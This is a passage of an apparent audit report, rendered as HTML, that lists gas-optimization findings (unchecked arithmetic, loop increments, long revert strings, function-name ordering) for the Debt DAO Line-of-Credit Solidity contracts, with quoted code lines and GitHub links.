require or if statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑07]  Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</h2>\n<p><code>require(a &#x3C;= b); x = b - a</code> => <code>require(a &#x3C;= b); unchecked { x = b - a }</code></p>\n<p><em>There are 3 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit if-condition on line 120</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">unusedTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">repaid</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">newTokens</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L122\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L122</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit if-condition on line 100</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">diff</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">oldClaimTokens</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">newClaimTokens</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L101\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L101</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit if-condition on line 95</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:               </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sendOutTokenOrETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">, </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">escrowedAmount</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L96\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L96</a></p>\n<h2 id=\"g08--ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" style=\"position:relative;\"><a href=\"#g08--ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" aria-label=\"g08  ii should be uncheckediuncheckedi when it is not possible for them to overflow as is the case when used in for  and while loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑08]  <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</h2>\n<p>The <code>unchecked</code> keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves <strong>30-40 gas <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked\">per loop</a></strong>.</p>\n<p><em>There are 6 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">len</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">203</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">len</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">lastSpot</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L179\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L179</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditListLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">len</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">len</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L23\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L23</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L57\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L57</a></p>\n<h2 id=\"g09--requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" style=\"position:relative;\"><a href=\"#g09--requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" aria-label=\"g09  requirerevert strings longer than 32 bytes cost extra gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑09]  <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</h2>\n<p>Each extra memory word of bytes past the original 32 <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings\">incurs an MSTORE</a> which costs <strong>3 gas</strong>.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interest</span><span class=\"mtk1\">-</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterestRateCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">26</span><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">                </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">lineContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">                </span><span class=\"mtk8\">&quot;InterestRateCred: only line contract.&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">:           );</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29</a></p>\n<h2 id=\"g10--optimize-names-to-save-gas\" style=\"position:relative;\"><a href=\"#g10--optimize-names-to-save-gas\" aria-label=\"g10  optimize names to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑10]  Optimize names to save gas</h2>\n<p><code>public</code>/<code>external</code> function names and <code>public</code> member variable names can be optimized to save gas. See <a href=\"https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9\">this</a> link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save <strong>128 gas</strong> each during deployment, and renaming functions to have lower method IDs will save <strong>22 gas</strong> per call, <a href=\"https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\">per sorted position shifted</a>.</p>\n<p><em>There are 15 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"130\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit init(), healthcheck(), counts(), declareInsolvent()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ILineOfCredit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MutualConsent</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L16\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L16</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SecuredLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit liquidate()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">11</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SecuredLine</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">EscrowedLine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ISecuredLine</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L11\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L11</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit unused(), claimAndRepay(), useAndRepay(), claimAndTrade(), updateOwnerSplit(), addSpigot(), updateWhitelist(), releaseSpigot(), sweep()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ISpigotedLine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ReentrancyGuard</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L22\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L22</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"133\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">escrow</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Escrow</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit isLiquidatable(), updateLine(), addCollateral(), enableCollateral(), releaseCollateral(), getCollateralRatio(), getCollateralValue(), liquidate()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Escrow</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IEscrow</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L19\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L19</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">factories</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit deployEscrow(), deploySpigot(), deploySecuredLine(), deploySecuredLineWithConfig(), deploySecuredLineWithModules(), rolloverSecuredLine()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LineFactory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ILineFactory</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L9\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L9</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interest</span><span class=\"mtk1\">-</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterestRateCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit setRate()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">InterestRateCredit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IInterestRateCredit</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L5\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L5</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"136\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Oracle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit getLatestAnswer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Oracle</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IOracle</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L13\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L13</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"137\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit operator(), claimRevenue(), claimEscrow(), operate(), addSpigot(), removeSpigot(), updateOwnerSplit(), updateOwner(), updateOperator(), updateTreasury(), updateWhitelistedFunction(), getEscrowed(), isWhitelisted(), getSetting()</span></span></span>\n<span class=\"grvsc-line\"><span 